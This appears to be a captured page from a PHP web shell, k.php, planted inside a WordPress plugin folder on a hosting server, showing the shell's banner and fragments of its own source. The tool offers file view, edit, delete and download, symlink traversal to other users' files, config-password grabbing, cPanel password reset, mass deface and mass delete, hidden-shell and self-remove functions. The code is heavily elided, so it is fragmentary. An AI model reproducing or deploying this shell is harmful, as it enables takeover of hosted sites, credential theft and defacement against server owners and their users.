...
Server Name:Linux webd058.cluster002.gra.hosting.ovh.net 4.14.154-ovh-vps-grsec-zfs-classid #1 SMP Wed Nov 13 11:24:26 CET 2019 x86_64	
 
User :cabinetgtm (90568) Group : users (100) Owner : (error) UserOwner : (error)	
Server IP :213.186.33.2 [BING] [Dossier] | Port : 80 | Your IP: 140.213.37.139	
Server Type : unknown | Website : ?? Domains
Safe Mode: OFF
Disable Functions:
_dyuweyrj4,_dyuweyrj4r,dl
Server Software: Apache [Exploit DB]
Directory : /home/cabinetgtm/www/gtec.pro/wordpress/wp-content/plugins/rqtwyxhh/	

Command :  
Home / Config / Jump / Sym / Cpanel / Sym / Mass / Mirror / Cgi / BC / About / Server Info / Self Remove / Hidden Shell / Config ResPass / Config PassGrab / Deface / Cpanel Reset /
Filename : k.php [ view ] [ edit ] [ rename ] [ download ] [ delete ]
<?php 
...
//start config list 
$ext        = array("v1", "v2", "v3", "wp", "WP", "blog", "client", "clients", "forum", "forums", "home", "new", "old", "site", "portal", "test", "demo", "wordpress", "joomla", "beta", "news", "main", "shop", "mage", "magento", "sites",
"cms", "secure", "support", "panel", "public");
$configtype = array( 
...
$show_ds = (!empty($ds)) ? "<input type='text' name='searchterm' size='30'style='background-color: rgb(41, 41, 41);border: 1px solid rgb(41, 41, 41);height: 12px;color: red;width: 385px;'value='$ds'readonly/>" : "<font
color=lime>NONE</font>"; 
...
echo ' 
    ...
    <tr> 
    <td>Server IP :<font color=lime>' . gethostbyname($_SERVER["HTTP_HOST"]) . '</font>  <span class="enabled"><a href="https://www.bing.com/search?q=IP:' . gethostbyname($_SERVER["HTTP_HOST"]) . '" target="_blank">[BING]</a></span> <span
class="enabled"><a href="https://centralops.net/co/domaindossier.aspx?addr=' . gethostbyname($_SERVER["HTTP_HOST"]) . '&dom_whois=true&dom_dns=true&traceroute=true&net_whois=true&svc_scan=true" target="_blank">[Dossier]</a></span> | Port :
<font color=lime>' . $sport . '</font> | Your IP: <font color=lime>' . $_SERVER["REMOTE_ADDR"] . '</font></td> 
    <td align="right">'; 
if ($server_type == "public_html") { 
...
echo ' 
  ...
  <tr> 
    <td>Server Software: ' . $_SERVER["SERVER_SOFTWARE"] . ' <span class="enabled"><a href="http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=' . $_SERVER["SERVER_SOFTWARE"] .
'&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=" target="_blank">[Exploit DB]</a></span> 
    </td> 
  </tr> 
  <tr> 
    <td>Directory : '; 
...
if (isset($_GET['act']) && ($_GET['act'] == 'delete')) {
    ...
    if (is_file($_GET['file'])) { 
        ...
        echo "Filename : <font color=lime>" . basename($_GET['file']) . "</font> [ <a href='?act=view&dir=$dir&file=" . $_GET['file'] . "'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=" . $_GET['file'] . "'>edit</a> ] [ <a
href='?act=rename&dir=$dir&file=" . $_GET['file'] . "'>rename</a> ] [ <a href='?act=download&dir=$dir&file=" . $_GET['file'] . "'>download</a> ] [ <a href='?act=delete&dir=$dir&file=" . $_GET['file'] . "'>delete</a> ]<br>"; 
...
<u>Team</u>:<br> 
    ...
    if ($_POST['email']) { 
        ...
        echo "Login here : <a href='https://$link:2083/resetpass?start=1&user=$user' target='_BLANK'>https://$link:2083/resetpass?start=1&user=$user</a> or <a href='http://$link:2082/resetpass?start=1&user=$user'
target='_BLANK'>http://$link:2082/resetpass?start=1&user=$user</a>"; 
    } 
...
'; 
 ...
 <td align=center><font size=3>Symlink</font></td></tr>"; 
                ...
                while (!feof($file)) { 
                    ...
                    if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches
== "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named") {
                        continue; 
                    } 
...
^^DIRECTORY^^ 
DefaultIcon
'data:image/png;base64,'
IndexIgnore *.txt404 
...
<br><a href=\"0xsymv/\">Configurations</a></center>"; 
    ...
    { 
        ...
        $files    = scandir($dirr); 
        $notallow = array(".htaccess", "error_log", "_vti_inf.html", "_private", "_vti_bin", "_vti_cnf", "_vti_log", "_vti_pvt", "_vti_txt", "cgi-bin", ".contactemail", ".cpanel", ".fantasticodata", ".htpasswds", ".lastlogin",
"access-logs", "cpbackup-exclude-used-by-backup.conf", ".cgi_auth", ".disk_usage", ".statspwd", "..", ".");
        sort($files); 
        $n = 0; 
    ...
    { 
        ...
        if ($dh = opendir($dirrall)) { 
            ...
            $inner_files = array(); 
            $me          = str_replace(dirname(__FILE__) . '/', '', __FILE__);
            $notallow    = array($me, ".htaccess", "error_log", "_vti_inf.html", "_private", "_vti_bin", "_vti_cnf", "_vti_log", "_vti_pvt", "_vti_txt", "cgi-bin", ".contactemail", ".cpanel", ".fantasticodata", ".htpasswds", ".lastlogin",
"access-logs", "cpbackup-exclude-used-by-backup.conf", ".cgi_auth", ".disk_usage", ".statspwd", "Thumbs.db");
    ...
    } elseif ($_POST['mass'] == 'sabunkabeh') {gass();} elseif ($_POST['mass'] == 'hapusmassal') {hapus_massal($_POST['d_dir'], $_POST['d_file']);} elseif ($_POST['mass'] == 'sabunmematikan') {gass_all();} elseif ($_POST['mass'] ==
'chmodkabeh') {chmod_all();} elseif ($_POST['mass'] == 'massdeface') {
...
<?php echo $content; ?> 
    ...
    echo "PHP Version: " . phpversion() . "<br /><br />Safe Mode: " . $s_safemode . "]</span><br /><br />Curl: " . $curls . "<br /><br />Accept Encoding:  " . $_SERVER['HTTP_ACCEPT_ENCODING'] . "<br /><br />Admin: " .
$_SERVER['SERVER_ADMIN'] . "<br /><br /><strong>Disabled Functions: </strong>"; 
    if (!empty($disabled)) { 
...
//////////// 
    ...
    if (is_dir($dir) == true) { 
        echo '<table  cellspacing="0" cellpadding="0"><tr><td class="TableHeader_Name"> FileName</td><td class="TableHeader">Filetype</a></td><td class="TableHeader">Size</td><td class="TableHeader">Permisions</td><td class="TableLast">Last
Modified</td><td class="TableHeaderoptions"> Options</td></tr>'; 
        $scandir = scandir($dir); 
        foreach ($scandir as $dirx) { 
            ...
            echo "<td class='td_home'><a id=\"" . clearspace($dirx) . "_link\"  href='?dir=" . $href . "'><img
src='data:image/png;base64,'>
 $dirx</a> 
...
<form method=\"post\" id=\"" . clearspace($dirx) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
        ...
        foreach ($scandir as $file) { 
            ...
            <a id=\"" . clearspace($file) . "_link\" href='?act=view&dir=$dir&file=$dir/$file'><img
src='data:image/png;base64,'>
 $file</a> 
    ...
    <form method=\"post\" id=\"" . clearspace($file) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
        ...
        <input class=\"inputzbut\" type=\"button\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($file) . "_form','" . clearspace($file) . "_link');\" />
            ...
            echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href=\"javascript:tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\">rename</a> | <a
href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>"; 
        } 
        echo "</tr></table>"; 
    } else { 
    ...
    ?></table> 
                <div
style="background:#282828;border-bottom-right-radius:4px;-moz-border-bottom-right-radius:4px;-webkit-border-bottom-right-radius:4px;border-bottom-left-radius:4px;-moz-border-bottom-left-radius:4px;-webkit-border-bottom-left-radius:4px;height:25px;margin:0px
0px 10px 0px;width:1000px;"> 
                    <center> 
